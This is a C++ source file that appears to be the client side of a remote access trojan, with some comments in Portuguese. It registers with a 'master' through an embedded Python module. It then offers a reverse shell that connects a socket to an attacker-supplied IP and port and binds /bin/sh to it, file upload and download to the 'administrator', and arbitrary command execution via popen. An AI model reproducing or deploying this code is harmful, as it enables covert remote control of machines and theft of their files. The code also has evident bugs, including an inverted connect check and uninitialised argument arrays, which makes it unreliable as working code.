

#include <iostream>
#include "clientManager.h"


/*for reverse shell*/
#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <errno.h>
#include <string.h>
#include <sys/wait.h> //waitpid

using namespace std;

clientManager::clientManager(){
    pModule =  PyImport_Import(PyUnicode_FromString("link"));
    link = PyObject_GetAttrString(pModule, "master");
    void makeRegister();
}

clientManager::~clientManager(){

}

vector <string> 
clientManager::getComand(){//fazer
    vector <string> saida;
    return saida;
}


void
clientManager::makeRegister()
{
    cout << "Registering" << endl;

    CPyObject isOk= PyObject_CallMethod(link, "makeRegister", NULL);

    if (isOk==Py_True)
    {
        cout << "Register confirmed" << endl;
    }
    else 
    {
        cout << "Register not confirmed" << endl;
    }
}


void 
clientManager::openShell(vector<string> cmd)
{
    struct sockaddr_in sa;
    int s;
    unsigned port = std::stoul (cmd[1]);
    pid_t pid_fork;
    string response;
    int status;

    cout << "running shell." << endl;
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(cmd[0].c_str());
    sa.sin_port = htons(port);
    
    pid_fork=fork();
    //if child
    if(pid_fork==0)
    {
        if ((s = socket(AF_INET, SOCK_STREAM, 0))!=-1 ){
            if (connect(s, (struct sockaddr *)&sa, sizeof(sa))==-1){
                dup2(s, 0);
                dup2(s, 1);
                dup2(s, 2);

                cout << "starting bash" << endl;
                
                char ** envp;
                envp[0]=(char *)string(".").c_str();
                envp[1]=nullptr;

                char ** argv;
                argv[0] = nullptr;

                execve("/bin/sh", argv, envp);
                //no return
            }
        }
        response=string("shell failed!") + strerror (errno);
        //manager.report(response.c_str());

    }
    else
    {
        waitpid(pid_fork,&status,0 );
        if (WIFEXITED(status)){
            printf("Exited Normally\n");
        }
    }
    
}

void 
clientManager::writefile(vector <string> cmd)
{
    if (cmd.size() == 1)
    {
        cout << "Sending file: " << cmd[0] << endl;

        CPyObject isOk= PyObject_CallMethod(link, "upload", "(s)", cmd[0].c_str());
        //upload do server para o client

        if (isOk==Py_True)
        {
            PyObject_CallMethod(link, "report", "(s)", "received file"); //arquivo do admin para o cliente
            cout << "administrator file uploaded." << endl;
        }
        else {
            PyObject_CallMethod(link, "report", "(s)", "don't received file");
            cout << "administrator file not uploaded." << endl;
        }
    }
    else 
    {
        cout << "File upload failed" << endl;
    }
}

void 
clientManager::sendfile(vector <string> cmd)
{
    if (cmd.size() == 1)
    {
        cout << "File download: " << cmd[0] << endl;
        CPyObject isOk= PyObject_CallMethod(link, "download", "(s)", cmd[0].c_str());

        if (isOk==Py_True)
        {
            PyObject_CallMethod(link, "report", "(s)", "file was sent"); //arquivo do admin para o cliente
            cout << "upload the file to the administrator" << endl;
        }
        else {
            PyObject_CallMethod(link, "report", "(s)", "file was not sent");
            cout << "upload the file to the administrator failed" << endl;
        }
    }
    else 
    {
        cout << "file download failed." << endl;
    }
   
}

void 
clientManager::execute(vector <string> cmd)//execProgram
{
    cout << "execProgram não implementado" << endl;
    PyObject_CallMethod(link, "report", "(s)", "execProgram não implementado");
}

void 
clientManager::run(vector <string> cmd)//runCommand
{

    if (cmd.size() == 1)
    {
        char buffer[128];
        string result = "";

        cout << "Executing command: " << cmd[0] << endl;
        
        FILE* pipe = popen(cmd[0].c_str(), "r");

        if (!pipe){
            PyObject_CallMethod(link, "report", "(s)", "file was not sent");
            cout << "command not found" << endl;
        }
        else {
            try {
                while (fgets(buffer, sizeof buffer, pipe) != NULL) {
                   result += buffer;
                }
            } 
            catch (...) 
            {
                pclose(pipe);
                cout << "command nor response of terminal." << endl;
            }
        }
        pclose(pipe);

        cout << result << endl;

        PyObject_CallMethod(link, "report", "(s)", "command executed"); //arquivo do admin para o cliente
        cout << "end of command executed" << endl;
        
    }
    else 
    {
        cout << "command not executed" << endl;
    } 

    cout <<"cmd executed" << endl;

    PyObject_CallMethod(link, "report", "(s)", "cmd executed");
}

void 
clientManager::isOK()
{
    PyObject_CallMethod(link, "clientOK", NULL);
}